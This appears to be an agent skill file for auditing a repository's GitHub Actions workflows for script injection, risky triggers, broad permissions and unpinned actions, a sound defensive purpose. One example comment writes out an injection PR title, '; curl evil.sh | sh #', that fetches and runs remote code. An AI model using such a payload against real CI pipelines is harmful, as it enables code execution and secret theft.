---
name: actions-injection-review
description: Audit this repo's GitHub Actions workflows (.github/workflows/) for script injection (untrusted ${{ }} context interpolated into a run: step), dangerous pull_request_target / workflow_run combinations, over-broad permissions, and unpinned third-party Action references. Use when asked to review workflow security or "can a PR title or branch name run code in CI".
---

# GitHub Actions injection audit

A narrow audit of one vulnerability class that neither CodeQL's workflow checks (missing `permissions:`) nor `owasp-review` (application code) look for.

Actions expands `${{ ... }}` as **raw text before the shell sees the script**. If the expression is a value an outside contributor controls, it becomes part of the command:

```yaml
# VULNERABLE: a PR titled  "; curl evil.sh | sh #  runs in CI
- run: echo "Building ${{ github.event.pull_request.title }}"
# SAFE: the value arrives as a real environment variable
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Building $PR_TITLE"
```

Verify against the **current** workflow files; do not trust a previous result.

## Method

1. **List every `run:` step** in `.github/workflows/*.y*ml` and read each full script body (a `run: |` block can bury a substitution).
2. **For every `${{` inside a `run:` body, name the source.**
   - Attacker-influenced (a finding): `github.event.issue.title/body`, `github.event.pull_request.title/body`, `github.event.comment.body`, `github.event.review.body`, `github.event.pull_request.head.ref`, `github.head_ref`, commit messages, and any form field a non-collaborator can fill in.
   - Trusted (say why, do not just pass): `github.sha`, `github.ref` on a push, `secrets.*` (the value is not attacker-chosen), `steps.*.outputs.*` that are static, `inputs.*` of a collaborator-only `workflow_dispatch`. Substitutions in `if:`, `with:`, `env:` and `environment:` are not shell and are out of scope here.
3. **Triggers.** `pull_request_target` or `workflow_run` run with the base repository's permissions and secrets. The dangerous combination is that trigger **plus** a checkout of `github.event.pull_request.head.*` **plus** a step that executes fork-controlled code (`npm ci`, a build, a test). Report the exact combination; the trigger alone is not a finding. This repo's workflows use `pull_request` (no secrets for forks).
4. **Permissions.** Each workflow or job has a `permissions:` block at the least privilege it needs (`contents: read` by default). A job that uploads artifacts or comments needs only that scope.
5. **Third-party Action references.** List every `uses:`. Mutable tags (`@v7`) on `actions/*` (GitHub-owned) are a low-severity note; a non-GitHub action on a mutable tag is a supply-chain dependency worth pinning to a commit SHA. Report this separately from injection, with the weight it deserves; Dependabot already proposes the updates.
6. **Secrets.** Any use of `secrets.*` should be for a named, current purpose. (The test storage secret is retired; none should remain in a workflow.)

## Reporting

Per finding: `file:line`, the exact injection string (a PR title, branch name, comment) that triggers it, and the fix (`env:` indirection). End with a per-workflow table (Assessed/Clean, Assessed/Finding(s)) and one line for the pinning check. File a real finding as an issue labeled `security`.
